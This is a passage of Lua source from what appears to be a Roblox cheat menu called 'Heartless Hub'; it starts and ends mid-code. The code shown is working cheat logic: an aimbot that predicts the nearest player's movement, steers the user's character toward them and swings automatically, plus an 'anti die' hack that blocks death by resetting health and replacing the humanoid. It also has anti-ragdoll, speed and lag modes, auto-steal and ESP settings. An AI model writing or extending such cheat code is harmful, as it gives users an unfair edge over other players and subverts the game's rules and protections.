    end
end

function startBatAimbotV2()
    if isHoldingCarryTool and isHoldingCarryTool() then
        autoBatV2Enabled = false
        V2State.Enabled = false
        return
    end
    if V2Connection then return end
    V2State.Enabled = true
    autoBatV2Enabled = true
    local char = LP.Character
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    local rootPart = char:FindFirstChild("HumanoidRootPart")
    if not humanoid or not rootPart then return end
    humanoid.AutoRotate = false

    V2Connection = RunService.RenderStepped:Connect(function(dt)
        if not V2State.Enabled then
            if V2Connection then V2Connection:Disconnect(); V2Connection = nil end
            return
        end
        V2State.TargetPlayer = getNearestPlayerV2()
        if not V2State.TargetPlayer or not V2State.TargetPlayer.Character then
            V2State.TargetPlayer = nil
            V2State.LastTargetPos = nil
            V2State.TargetVelocity = Vector3.zero
            V2State.SmoothedVelocity = Vector3.zero
            V2State.VelocityHistory = {}
            V2State.AccelerationHistory = {}
            V2State.AerialVelocityHistory = {}
            V2State.VerticalVelocityHistory = {}
            V2State.AerialSmoothVelocity = Vector3.zero
            V2State.AirborneTime = 0
            V2State.HighYVelocityTime = 0
            V2State.PreviousDirection = nil
            V2State.WasAirborne = false
            V2State.LastYVelocity = 0
            V2State.PeakHeight = 0
            V2State.IsMultiJumping = false
            return
        end

        local targetRoot = V2State.TargetPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not targetRoot then return end

        local targetPos = targetRoot.Position
        local myPos = rootPart.Position

        if V2State.LastTargetPos then
            local deltaPos = targetPos - V2State.LastTargetPos
            local rawVelocity = deltaPos / dt
            rawVelocity = clampVelocityChangeV2(rawVelocity, V2State.TargetVelocity, CONFIG_V2.MaxVelocityChange)

            local horizontalVel = Vector3.new(rawVelocity.X, 0, rawVelocity.Z)
            if horizontalVel.Magnitude > CONFIG_V2.MaxHorizontalVel then
                horizontalVel = horizontalVel.Unit * CONFIG_V2.MaxHorizontalVel
                rawVelocity = Vector3.new(horizontalVel.X, rawVelocity.Y, horizontalVel.Z)
            end

            local currentAcceleration = (rawVelocity - V2State.TargetVelocity) / dt
            table.insert(V2State.AccelerationHistory, currentAcceleration)
            if #V2State.AccelerationHistory > CONFIG_V2.AccelHistorySize then table.remove(V2State.AccelerationHistory, 1) end

            table.insert(V2State.VerticalVelocityHistory, rawVelocity.Y)
            if #V2State.VerticalVelocityHistory > CONFIG_V2.VerticalHistorySize then table.remove(V2State.VerticalVelocityHistory, 1) end

            V2State.TargetVelocity = rawVelocity
            V2State.SmoothedVelocity = smoothVelocityV2(V2State.SmoothedVelocity, V2State.TargetVelocity, CONFIG_V2.VelocitySmoothing)

            table.insert(V2State.VelocityHistory, V2State.TargetVelocity)
            if #V2State.VelocityHistory > CONFIG_V2.VelocityHistorySize then table.remove(V2State.VelocityHistory, 1) end
        end

        V2State.LastTargetPos = targetPos

        if math.abs(V2State.TargetVelocity.Y) > 35 then
            V2State.HighYVelocityTime = V2State.HighYVelocityTime + dt
        else
            V2State.HighYVelocityTime = 0
        end

        local isAirborne = checkAirborneV2(targetRoot, V2State.TargetPlayer)

        if isAirborne then
            V2State.AirborneTime = V2State.AirborneTime + dt
            if targetPos.Y > V2State.PeakHeight then V2State.PeakHeight = targetPos.Y end
            if V2State.AirborneTime >= CONFIG_V2.MinAirborneTime then
                table.insert(V2State.AerialVelocityHistory, V2State.TargetVelocity)
                if #V2State.AerialVelocityHistory > CONFIG_V2.AerialHistorySize then table.remove(V2State.AerialVelocityHistory, 1) end
                V2State.AerialSmoothVelocity = smoothVelocityV2(V2State.AerialSmoothVelocity, V2State.TargetVelocity, CONFIG_V2.AerialSmoothing)
            end
            V2State.WasAirborne = true
        else
            V2State.AirborneTime = 0
            V2State.WasAirborne = false
            V2State.AerialVelocityHistory = {}
            V2State.AerialSmoothVelocity = Vector3.zero
            V2State.LastGroundedPosition = targetPos
            V2State.PeakHeight = 0
        end

        local isJumping = math.abs(V2State.TargetVelocity.Y) > 8
        local isInfJump = isInfiniteJumpingV2()
        local isFloater = isFloatingV2()
        local isJumpBoost = isJumpBoostCheatV2()
        local isExtremeBoost = isExtremeJumpBoostV2()
        local isErratic = isErraticMovementV2()
        local avgVelocity = getAverageVelocityV2()
        local avgAcceleration = getAverageAccelerationV2()
        local isQuickTurn = detectDirectionChangeV2(V2State.TargetVelocity)
        local isStrafing = isAerialStrafingV2()
        local isTrulyAirborne = isAirborne and V2State.AirborneTime >= CONFIG_V2.MinAirborneTime
        local wasRising = V2State.LastYVelocity > 8
        V2State.IsMultiJumping = detectMultiJumpV2(V2State.TargetVelocity.Y, wasRising)
        local isFastFalling = isFallingFromHeightV2(targetPos, V2State.TargetVelocity.Y)
        local avgYVel = getAverageVerticalVelocityV2()

        V2State.LastYVelocity = V2State.TargetVelocity.Y

        local predictionVel = V2State.TargetVelocity
        local predictionAccel = avgAcceleration
        local useCurrentPos = false

        if isExtremeBoost then
            useCurrentPos = true
            predictionVel = Vector3.new(avgVelocity.X, 0, avgVelocity.Z)
            predictionAccel = Vector3.zero
        elseif isJumpBoost then
            local avgH = Vector3.new(avgVelocity.X, 0, avgVelocity.Z)
            predictionVel = Vector3.new(avgH.X, V2State.TargetVelocity.Y * 0.15, avgH.Z)
            predictionAccel = Vector3.new(avgAcceleration.X, 0, avgAcceleration.Z)
        elseif isInfJump or isFloater then
            local avgH = Vector3.new(avgVelocity.X, 0, avgVelocity.Z)
            predictionVel = Vector3.new(avgH.X, V2State.TargetVelocity.Y * 0.5, avgH.Z)
            predictionAccel = Vector3.new(avgAcceleration.X * 0.5, 0, avgAcceleration.Z * 0.5)
        elseif isTrulyAirborne and isStrafing then
            local avgAerial = getAverageAerialVelocityV2()
            predictionVel = Vector3.new(
                V2State.AerialSmoothVelocity.X * CONFIG_V2.AerialDirectionWeight + avgAerial.X * (1 - CONFIG_V2.AerialDirectionWeight),
                avgYVel,
                V2State.AerialSmoothVelocity.Z * CONFIG_V2.AerialDirectionWeight + avgAerial.Z * (1 - CONFIG_V2.AerialDirectionWeight)
            )
            predictionAccel = Vector3.new(avgAcceleration.X * 0.3, 0, avgAcceleration.Z * 0.3)
        elseif isTrulyAirborne then
            predictionVel = Vector3.new(V2State.AerialSmoothVelocity.X, avgYVel, V2State.AerialSmoothVelocity.Z)
            predictionAccel = Vector3.zero
        elseif isErratic then
            predictionVel = Vector3.new(V2State.SmoothedVelocity.X, V2State.TargetVelocity.Y, V2State.SmoothedVelocity.Z)
            predictionAccel = Vector3.new(avgAcceleration.X * 0.7, 0, avgAcceleration.Z * 0.7)
        end

        local serverPredictedPos
        if useCurrentPos then
            serverPredictedPos = targetPos
        else
            serverPredictedPos = predictServerPositionV2(
                targetPos, predictionVel, predictionAccel, V2State.CurrentPing,
                isQuickTurn, isTrulyAirborne, isStrafing, isFastFalling, V2State.IsMultiJumping
            )
        end

        local predTime = CONFIG_V2.PredictionTime * 1.1
        if isErratic then predTime = predTime * 0.6
        elseif isQuickTurn then predTime = predTime * 1.2
        elseif isTrulyAirborne and isStrafing then predTime = predTime * 0.7
        elseif isTrulyAirborne and isFastFalling then predTime = predTime * 1.3
        elseif isTrulyAirborne then predTime = predTime * 0.85 end

        local predictedPos
        if isTrulyAirborne then
            predictedPos = predictAerialPositionV2(serverPredictedPos, predictionVel, predTime, isStrafing, isFastFalling, V2State.IsMultiJumping)
        else
            predictedPos = serverPredictedPos + predictionVel * predTime
        end

        local verticalOffset = Vector3.zero
        if not isTrulyAirborne and not isExtremeBoost and not isJumpBoost and not isInfJump then
            if V2State.TargetVelocity.Y < -8 or V2State.TargetVelocity.Y > 8 then
                verticalOffset = Vector3.new(0, V2State.TargetVelocity.Y * 0.15, 0)
            end
        end
        predictedPos = predictedPos + verticalOffset

        local interceptOffset = Vector3.zero
        local horizontalVel = Vector3.new(predictionVel.X, 0, predictionVel.Z)
        if horizontalVel.Magnitude > 1 and not useCurrentPos then
            interceptOffset = horizontalVel.Unit * CONFIG_V2.PredictAhead
        end

        local interceptPoint = predictedPos + interceptOffset

        local toTarget = interceptPoint - myPos
        if toTarget.Magnitude > 0.1 then
            updateRotationAngularV2(toTarget, rootPart)
        end

        local actualDistance = (targetPos - myPos).Magnitude

        if actualDistance <= CONFIG_V2.ActivateDistance then
            local currentTime = tick()
            if currentTime - V2State.LastActivationTime >= 0.3 then
                local tool = char:FindFirstChildOfClass("Tool")
                if tool then tool:Activate() end
                V2State.LastActivationTime = currentTime
            end
        end

        local direction = interceptPoint - myPos
        if direction.Magnitude > CONFIG_V2.MinFollowDistance then
            local dirUnit = direction.Unit
            local currentSpeed = CONFIG_V2.FollowSpeed
            if isJumping then currentSpeed = currentSpeed * CONFIG_V2.JumpSpeedBoost end
            if isExtremeBoost then currentSpeed = currentSpeed * 1.3
            elseif isJumpBoost or isInfJump or isFloater then currentSpeed = currentSpeed * 1.15 end
            if isErratic then currentSpeed = currentSpeed * 0.9
            elseif isQuickTurn then currentSpeed = currentSpeed * 1.1
            elseif isTrulyAirborne and isStrafing then currentSpeed = currentSpeed * 0.95
            elseif isTrulyAirborne and isFastFalling then currentSpeed = currentSpeed * 1.15
            elseif isTrulyAirborne then currentSpeed = currentSpeed * 1.05 end
            currentSpeed = math.min(currentSpeed, CONFIG_V2.MaxSpeed)
            rootPart.AssemblyLinearVelocity = dirUnit * currentSpeed
        else
            rootPart.AssemblyLinearVelocity = Vector3.new(0, rootPart.AssemblyLinearVelocity.Y * 0.5, 0)
        end
    end)
end

function stopBatAimbotV2()
    if V2Connection then
        V2Connection:Disconnect()
        V2Connection = nil
    end
    V2State.Enabled = false
    autoBatV2Enabled = false -- removed
    local char = LP.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then hum.AutoRotate = true end
        local root = char:FindFirstChild("HumanoidRootPart")
        if root then root.AssemblyAngularVelocity = Vector3.zero end
    end

    V2State.TargetPlayer = nil
    V2State.LastTargetPos = nil
    V2State.TargetVelocity = Vector3.zero
    V2State.SmoothedVelocity = Vector3.zero
    V2State.VelocityHistory = {}
    V2State.AccelerationHistory = {}
    V2State.AerialVelocityHistory = {}
    V2State.VerticalVelocityHistory = {}
    V2State.AerialSmoothVelocity = Vector3.zero
    V2State.AirborneTime = 0
    V2State.HighYVelocityTime = 0
    V2State.PreviousDirection = nil
    V2State.WasAirborne = false
    V2State.LastYVelocity = 0
    V2State.PeakHeight = 0
    V2State.GroundHeight = 0
    V2State.IsMultiJumping = false
    V2State.LastActivationTime = 0
end

function toggleBatAimbotV2()
    if autoBatV2Enabled then
        stopBatAimbotV2()
    else
        startBatAimbotV2()
    end
end

LP.CharacterAdded:Connect(function(char)
    local shouldRestart=autoBatV2Enabled
    if shouldRestart then
        stopBatAimbotV2()
        task.wait(0.5)
        startBatAimbotV2()
    end
end)

local savedBatAimbotWalkSpeed=nil
local function blockBatAimbotMovementInput()
    local character=LP.Character
    local humanoid=character and character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    if savedBatAimbotWalkSpeed==nil then savedBatAimbotWalkSpeed=humanoid.WalkSpeed end
    humanoid.WalkSpeed=0
    humanoid:Move(Vector3.zero,false)
end

local function restoreBatAimbotMovementInput()
    local character=LP.Character
    local humanoid=character and character:FindFirstChildOfClass("Humanoid")
    if humanoid and savedBatAimbotWalkSpeed~=nil then humanoid.WalkSpeed=savedBatAimbotWalkSpeed end
    savedBatAimbotWalkSpeed=nil
end

local spectrumStopBatAimbot=stopBatAimbot
stopBatAimbot=function()
    local result=spectrumStopBatAimbot()
    restoreBatAimbotMovementInput()
    return result
end

local spectrumStopBatAimbotV2=stopBatAimbotV2
stopBatAimbotV2=function()
    local result=spectrumStopBatAimbotV2()
    restoreBatAimbotMovementInput()
    return result
end

local spectrumStartBatAimbot=startBatAimbot
startBatAimbot=function()
    if autoBatV2Enabled and stopBatAimbotV2 then stopBatAimbotV2() end
    destroySpeedConstraint()
    blockBatAimbotMovementInput()
    return spectrumStartBatAimbot()
end

local spectrumStartBatAimbotV2=startBatAimbotV2
startBatAimbotV2=function()
    if autoBatEnabled and stopBatAimbot then stopBatAimbot() end
    destroySpeedConstraint()
    blockBatAimbotMovementInput()
    return spectrumStartBatAimbotV2()
end

LP.CharacterAdded:Connect(function()
    task.wait(0.6)
    if autoBatEnabled or autoBatV2Enabled then blockBatAimbotMovementInput() end
end)

saveConfig=function()
    local function ks(e)
        if e.kb then return {kb=e.kb.Name,gp=e.gp and e.gp.Name}
        elseif e.gp then return {gp=e.gp.Name}
        else return {kb=nil,gp=nil} end
    end
    local savedKeys={}
    if type(_SavedGuiKeys)=="table" then
        for k,v in pairs(_SavedGuiKeys) do
            savedKeys[k]=(type(v)=="string") and v or (v and v.Name) or nil
        end
    end
    if type(_GuiKeys)=="table" then
        for k,v in pairs(_GuiKeys) do
            savedKeys[k]=(type(v)=="string") and v or (v and v.Name) or nil
        end
    end
    _SavedGuiKeys = savedKeys
    local cfg={normalSpeed=NS,carrySpeed=CS,dropBrainrotKey=ks(KB.DropBrainrot),autoLeftKey=ks(KB.AutoLeft),autoRightKey=ks(KB.AutoRight),autoBatKey=ks(KB.AutoBat),laggerToggleKey=ks(KB.LaggerToggle),tpFloorKey=ks(KB.TPFloor),guiHideKey=ks(KB.GuiHide),speedToggleKey=ks(KB.SpeedToggle),tpBatKey=ks(KB.TPBat),grabRadius=Steal.StealRadius,stealDuration=Steal.StealDuration,stealMode=stealMode,antiRagdoll=antiRagdollEnabled,autoResetOnDieEnabled=autoResetOnDieEnabled,autoResetOnMedusaEnabled=autoResetOnMedusaEnabled,antiDieEnabled=antiDieEnabled,autoStealEnabled=Steal.AutoStealEnabled,infiniteJump=infJumpEnabled,infJumpMode=infJumpMode,medusaCounter=medusaCounterEnabled,batCounter=batCounterEnabled,carrySpeedActive=carrySpeedActive,laggerModeEnabled=laggerModeEnabled,laggerSpeed=LAGGER_SPEED,laggerCarrySpeed=LAGGER_CARRY_SPEED,autoBat=autoBatEnabled,aimbotSpeed=aimbotSpeed,autoSwing=autoSwingEnabled,unwalkEnabled=unwalkEnabled,antiLag=antiLagEnabled,stretchRez=stretchRezEnabled,autoTPEnabled=autoTPEnabled,autoTPHeight=autoTPHeight,guiTransparencyEnabled=guiTransparencyEnabled,mobileButtonsEnabled=mobileButtonsEnabled,mobileButtonsLocked=mobileButtonsLocked,mobileButtonsSize=mobileButtonsSize,mobileButtonsLayout=mobileButtonsLayout,circleButtonsEnabled=circleButtonsEnabled,mobileButtonShape=mobileButtonShape,autoSwitchSpeed=autoSwitchSpeedEnabled,fovValue=fovValue,perButtonDrag=perButtonDragEnabled,uiLayoutMode=uiLayoutMode,skyTheme=currentSkyTheme,baseTheme=baseThemeMode,batTheme=batThemeMode,autoMoveSwing=autoMoveSwingEnabled,autoMoveSwingInterval=autoMoveSwingInterval,ragdollGui=ragdollGuiEnabled,ragdollGuiPos=ragdollGuiPos,ragdollGuiCustomX=ragdollGuiCustomX,ragdollGuiCustomY=ragdollGuiCustomY,introSoundEnabled=introSoundEnabled,introEnabled=introEnabled,selectedIntroMusic=selectedIntroMusic,introStyle=introStyle,animEnabled=animEnabled,selectedAnimPack=selectedAnimPack,headlessEnabled=headlessEnabled,korbloxEnabled=korbloxEnabled,korbloxLeg=korbloxLeg,blueEspEnabled=blueEspEnabled,speedEspEnabled=speedEspEnabled,mirrorTPDown=mirrorTPDownEnabled,aimbotMode=aimbotMode,tpBatVersion=tpBatVersion,mobBtnBgId=mobBtnBgId,bypassEnabled=bypassEnabled,laggerPanelEnabled=laggerPanelEnabled,bypassFxEnabled=bypassFxEnabled,bypassFxMode=bypassFxMode,bypassFxStyle=bypassFxStyle,guiPositionsSaved=guiPositionsSaved,hubPosSX=hubPosSX,hubPosOX=hubPosOX,hubPosSY=hubPosSY,hubPosOY=hubPosOY,bypassPosSX=bypassPosSX,bypassPosOX=bypassPosOX,bypassPosSY=bypassPosSY,bypassPosOY=bypassPosOY,laggerPosSX=laggerPosSX,laggerPosOX=laggerPosOX,laggerPosSY=laggerPosSY,laggerPosOY=laggerPosOY,batDesyncTpEnabled=TPBat.enabled,tpBatDistance=tpBatDistance,stealBarPos=stealBarPos,stealBarCustomX=stealBarCustomX,stealBarCustomY=stealBarCustomY,stealBarStyle=stealBarStyle,watermarkEnabled=watermarkEnabled,watermarkCustomX=watermarkCustomX,watermarkCustomY=watermarkCustomY,trackerEnabled=trackerEnabled,trackerMode=trackerMode,trackerScale=trackerScale,trackerBgEnabled=trackerBgEnabled,trackerPosSX=trackerPosSX,trackerPosSY=trackerPosSY,trackerPosOX=trackerPosOX,trackerPosOY=trackerPosOY,highPingWarnEnabled=highPingWarnEnabled,highPingThreshold=highPingThreshold,customBgId=customBgId,introSoundId=introSoundId,bodyLockEnabled=bodyLockEnabled,bodyLockRange=bodyLockRange,btnPositions=getBtnPositionsTable(),keys=savedKeys}
    cfg.autoLeft=autoLeftEnabled;cfg.autoRight=autoRightEnabled;cfg.normalStealVersion=normalStealVersion;cfg.fovIndex=fovIndex;cfg.uiScale=uiScaleValue;cfg.uiThemeIndex=uiThemeIndex;cfg.configVersion=3
    if writefile then pcall(function() writefile(CONFIG_FILE,HS:JSONEncode(cfg)) end) end
end

function resetAllSettings()
    NS=59;CS=29;LAGGER_SPEED=30;LAGGER_CARRY_SPEED=15;carrySpeedActive=false;laggerModeEnabled=false
    autoSwitchSpeedEnabled=false;antiRagdollEnabled=false;infJumpEnabled=false;infJumpMode="manual"
    medusaCounterEnabled=false;batCounterEnabled=false;unwalkEnabled=false;baseThemeMode="Normal";pcall(function() if applyBaseTheme then applyBaseTheme("Normal") end end)
    autoLeftEnabled=false;autoRightEnabled=false;autoBatEnabled=false;autoSwingEnabled=true;autoMoveSwingEnabled=false
    autoTPEnabled=false;autoTPHeight=20;antiLagEnabled=false;stretchRezEnabled=false
    Steal.AutoStealEnabled=false;Steal.StealRadius=60;Steal.StealDuration=1.4;stealMode="normal"
    guiTransparencyEnabled=false;mobileButtonsEnabled=true;mobileButtonsSize=80
    circleButtonsEnabled=false;uiLocked=false;fovValue=80;fovIndex=1
    introSoundEnabled=true;introEnabled=true
    pcall(function() setHeadlessAppearance(false) end)
    pcall(function() setKorbloxAppearance(false) end)
    stopBlueESP()
    headlessEnabled=false;korbloxEnabled=false;korbloxLeg="Both";blueEspEnabled=false
    KB.DropBrainrot={kb=nil,gp=nil};KB.AutoLeft={kb=nil,gp=nil};KB.AutoRight={kb=nil,gp=nil}
    KB.AutoBat={kb=nil,gp=nil};KB.TPFloor={kb=nil,gp=nil}
    KB.GuiHide={kb=nil,gp=nil};KB.SpeedToggle={kb=nil,gp=nil};KB.LaggerToggle={kb=nil,gp=nil}
    if refreshSpeedModeLabel then refreshSpeedModeLabel() end
    if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(carrySpeedActive) end
    if mobBtnRefs.lagger then mobBtnRefs.lagger(laggerModeEnabled) end
    if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end
    if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end
    if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end
    stopBatAimbot();stopBatAimbotV2();stopAutoSteal();stopAutoLeft();stopAutoRight();stopAntiRagdoll();stopAutoTP();stopHoldInfJump()
    if stretchRezEnabled then disableStretchRez() end;if antiLagEnabled then disableAntiLag() end;saveConfig()
end

mainFrame=nil
_persistentConns={}
function trackConn(conn) table.insert(_persistentConns,conn);return conn end
function clearPersistentConns() for _,c in ipairs(_persistentConns) do pcall(function() c:Disconnect() end) end;_persistentConns={} end

refreshSpeedModeLabel=function()
    if modeValLbl then
        if laggerModeEnabled then
            modeValLbl.Text = carrySpeedActive and "Lagger Carry" or "Lagger Mode"
        elseif carrySpeedActive then
            modeValLbl.Text = "Carry Mode"
        else
            modeValLbl.Text = "Normal Speed"
        end
    end
    if laggerModePillRef and laggerModePillRef.pill and laggerModePillRef.dot then
        local pill=laggerModePillRef.pill;local dot=laggerModePillRef.dot;local on=laggerModeEnabled
        local WHITE=Color3.fromRGB(255,255,255);local OFF=Color3.fromRGB(46,24,38);local GRAY=Color3.fromRGB(180,150,165)
        TweenService:Create(pill,TweenInfo.new(0.16,Enum.EasingStyle.Quad),{BackgroundColor3=on and WHITE or OFF}):Play()
        TweenService:Create(dot,TweenInfo.new(0.16,Enum.EasingStyle.Back),{Position=on and UDim2.new(1,-13,0.5,-5) or UDim2.new(0,3,0.5,-5),BackgroundColor3=on and Color3.fromRGB(30,30,30) or GRAY}):Play()
    end
    if carryModePillRef and carryModePillRef.pill and carryModePillRef.dot then
        local pill=carryModePillRef.pill;local dot=carryModePillRef.dot;local on=carrySpeedActive
        local WHITE=Color3.fromRGB(255,255,255);local OFF=Color3.fromRGB(46,24,38);local GRAY=Color3.fromRGB(180,150,165)
        TweenService:Create(pill,TweenInfo.new(0.16,Enum.EasingStyle.Quad),{BackgroundColor3=on and WHITE or OFF}):Play()
        TweenService:Create(dot,TweenInfo.new(0.16,Enum.EasingStyle.Back),{Position=on and UDim2.new(1,-13,0.5,-5) or UDim2.new(0,3,0.5,-5),BackgroundColor3=on and Color3.fromRGB(30,30,30) or GRAY}):Play()
    end
end

toggleCarryMode=function()
    if laggerModeEnabled then
        laggerModeEnabled = false
    end
    carrySpeedActive = not carrySpeedActive
    if refreshSpeedModeLabel then refreshSpeedModeLabel() end
    if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(carrySpeedActive) end
    if mobBtnRefs.lagger then mobBtnRefs.lagger(laggerModeEnabled) end
    if saveConfig then pcall(saveConfig) end
end

toggleLaggerMode=function()
    if not laggerModeEnabled then
        laggerModeEnabled = true
        carrySpeedActive = false
    else
        laggerModeEnabled = false
    end
    if refreshSpeedModeLabel then refreshSpeedModeLabel() end
    if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(carrySpeedActive) end
    if mobBtnRefs.lagger then mobBtnRefs.lagger(laggerModeEnabled) end
    if saveConfig then pcall(saveConfig) end
end

function speedToggleAction()
    if toggleCarryMode then
        toggleCarryMode()
        if saveConfig then pcall(saveConfig) end
    end
end

local _OceanAntiDie = { enabled=false, healthConn=nil, diedConn=nil, charConn=nil, humanoid=nil }
local function _oceanAntiDieDisconnect()
    if _OceanAntiDie.healthConn then pcall(function() _OceanAntiDie.healthConn:Disconnect() end); _OceanAntiDie.healthConn=nil end
    if _OceanAntiDie.diedConn then pcall(function() _OceanAntiDie.diedConn:Disconnect() end); _OceanAntiDie.diedConn=nil end
    _OceanAntiDie.humanoid=nil
end
local function activateOceanAntiDie(char)
    if not _OceanAntiDie.enabled then return end
    char = char or player.Character or player.CharacterAdded:Wait()
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 3)
    if not hum or not _OceanAntiDie.enabled then return end
    _oceanAntiDieDisconnect()
    _OceanAntiDie.humanoid = hum
    pcall(function()
        hum.BreakJointsOnDeath = false
        hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
    end)
    _OceanAntiDie.healthConn = hum:GetPropertyChangedSignal("Health"):Connect(function()
        if _OceanAntiDie.enabled and hum.Parent and hum.Health <= 0 then
            pcall(function() hum.Health = hum.MaxHealth end)
        end
    end)
    _OceanAntiDie.diedConn = hum.Died:Connect(function()
        if not _OceanAntiDie.enabled or not char.Parent then return end
        task.wait()
        if not _OceanAntiDie.enabled or not char.Parent then return end
        local newHum = Instance.new("Humanoid")
        newHum.Name = "ReplacedHumanoid"
        newHum.BreakJointsOnDeath = false
        pcall(function() newHum:SetStateEnabled(Enum.HumanoidStateType.Dead, false) end)
        newHum.Parent = char
        pcall(function()
            if workspace.CurrentCamera then workspace.CurrentCamera.CameraSubject = newHum end
        end)
        if hum.Parent then pcall(function() hum:Destroy() end) end
        if _OceanAntiDie.enabled then activateOceanAntiDie(char) end
    end)
end
function startAntiDie()
    _OceanAntiDie.enabled = true
    antiDieEnabled = true
    if _OceanAntiDie.charConn then pcall(function() _OceanAntiDie.charConn:Disconnect() end) end
    _OceanAntiDie.charConn = player.CharacterAdded:Connect(function(char)
        if _OceanAntiDie.enabled then task.defer(function() activateOceanAntiDie(char) end) end
    end)
    task.defer(function() activateOceanAntiDie(player.Character) end)
    pcall(function() print("[Heartless Hub] Anti Die: ON") end)
end
function stopAntiDie()
    _OceanAntiDie.enabled = false
    antiDieEnabled = false
    if _OceanAntiDie.charConn then pcall(function() _OceanAntiDie.charConn:Disconnect() end); _OceanAntiDie.charConn=nil end
    local hum = _OceanAntiDie.humanoid
    _oceanAntiDieDisconnect()
    if hum and hum.Parent then
        pcall(function()
            hum.BreakJointsOnDeath = true
            hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
        end)
    end
    pcall(function() print("[Heartless Hub] Anti Die: OFF") end)
end

local _antiRagResetCooldown = 0
local function forceAntiRagdollReset()
    local char = LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    if not hum or not root or hum.Health <= 0 then return end
    pcall(function()
        hum:ChangeState(Enum.HumanoidStateType.GettingUp)
        root.Velocity = Vector3.zero
        root.RotVelocity = Vector3.zero
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero
        for _, obj in ipairs(char:GetDescendants()) do
            if obj:IsA("Motor6D") then obj.Enabled = true end
            if obj:IsA("Constraint") then obj.Enabled = true end
        end
        workspace.CurrentCamera.CameraSubject = hum
        local PM = LP:FindFirstChild("PlayerScripts") and LP.PlayerScripts:FindFirstChild("PlayerModule")
        if PM then
            local ok, CM = pcall(function() return require(PM:FindFirstChild("ControlModule")) end)
            if ok and CM and CM.Enable then pcall(function() CM:Enable() end) end
        end
        hum.AutoRotate = true
        hum.PlatformStand = false
        hum.Sit = false
    end)
end
startAntiRagdoll=function()
    if Conns.antiRag then return end
    antiRagdollEnabled = true
    Conns.antiRag = RunService.Heartbeat:Connect(function()
        if not antiRagdollEnabled then return end
        local char = LP.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum or hum.Health <= 0 then return end
        local state = hum:GetState()
        local isRagdolled = (state == Enum.HumanoidStateType.Physics
            or state == Enum.HumanoidStateType.Ragdoll
            or state == Enum.HumanoidStateType.FallingDown)
        if isRagdolled then
            local now = tick()
            if now - _antiRagResetCooldown > 0.15 then
                _antiRagResetCooldown = now
                forceAntiRagdollReset()
            end
        end
    end)
end
stopAntiRagdoll=function()
    antiRagdollEnabled = false
    if Conns.antiRag then
        Conns.antiRag:Disconnect()
        Conns.antiRag = nil
    end
end
startUnwalk=function()
    local c=LP.Character;if not c then return end;local hum=c:FindFirstChildOfClass("Humanoid")
    if hum then for _,t in ipairs(hum:GetPlayingAnimationTracks()) do t:Stop() end end
    local anim=c:FindFirstChild("Animate");if anim then unwalkSavedAnimate=anim:Clone();anim:Destroy() end
end
stopUnwalk=function() local c=LP.Character;if c and unwalkSavedAnimate then unwalkSavedAnimate:Clone().Parent=c;unwalkSavedAnimate=nil end end

function applyStealBarPosition()
    if not stealBarFrame or not stealBarFrame.Parent then return end
    local SB_W = stealBarFrame.Size.X.Offset
    if SB_W < 1 then
        if stealBarStyle == 2 then SB_W = 280
        elseif stealBarStyle == 3 then SB_W = 280
        elseif stealBarStyle == 4 then SB_W = 320
        elseif stealBarStyle == 5 then SB_W = 220
        else SB_W = (UIS and UIS.TouchEnabled) and 280 or 340 end
    end
    if stealBarPos == "UP" then
        stealBarFrame.Position = UDim2.new(0.5, -math.floor(SB_W/2), 0, 12)
    elseif stealBarPos == "DOWN" then
        local SB_H = stealBarFrame.Size.Y.Offset
        if SB_H < 1 then
            if stealBarStyle == 2 then SB_H = 40
            elseif stealBarStyle == 3 then SB_H = 96
            elseif stealBarStyle == 4 then SB_H = 88
            elseif stealBarStyle == 5 then SB_H = 28
            else SB_H = 36 end
        end
        local invGap = 78 -- space for backpack / tool bar
        if UIS and UIS.TouchEnabled then invGap = 92 end
        local bottomPad = SB_H + invGap
        stealBarFrame.Position = UDim2.new(0.5, -math.floor(SB_W/2), 1, -bottomPad)
    else
        local cx = (type(stealBarCustomX)=="number") and stealBarCustomX or 0.5
        local cy = (type(stealBarCustomY)=="number") and stealBarCustomY or 0.02
        cx = math.clamp(cx, 0.05, 0.95)
        cy = math.clamp(cy, 0.02, 0.92)
        stealBarCustomX, stealBarCustomY = cx, cy
        stealBarFrame.Position = UDim2.new(cx, -math.floor(SB_W/2), cy, 0)
    end
    stealBarFrame.Visible = true
end

function resetStealBarPosition()
    stealBarPos = "UP"
    stealBarCustomX = 0.5
    stealBarCustomY = 0.02
    applyStealBarPosition()
    if saveConfig then pcall(saveConfig) end
end

function getStealTargetInfo()
    local name, image = nil, ""
    local prompt
    pcall(function() prompt = findNearestPrompt and findNearestPrompt() end)
    if prompt and prompt.Parent then
        pcall(function()
            local ot = prompt.ObjectText
            if type(ot) == "string" and #ot > 1 and not ot:lower():find("steal") then
                name = ot
            end
        end)
        local node = prompt.Parent
        for _ = 1, 10 do
            if not node then break end
            -- common: AnimalPodiums → podium model
            if node.Name == "AnimalPodiums" or node.Name == "Plots" then break end
            local n = node.Name
            local ln = string.lower(tostring(n))
            if node:IsA("Model") or node:IsA("Folder") then
                if not (ln == "base" or ln == "spawn" or ln == "promptattachment" or ln:find("podium") == 1 and #ln < 10) then
                    if ln ~= "base" and ln ~= "spawn" then
                        -- prefer meaningful model names
                        if not (ln == "handle" or ln == "humanoidrootpart") then
                            name = n
                        end
                    end
                end
            end
            -- billboard / surface name labels
            for _, d in ipairs(node:GetDescendants()) do
                if d:IsA("TextLabel") or d:IsA("TextBox") then
                    local tx = tostring(d.Text or ""):gsub("^%s+",""):gsub("%s+$","")
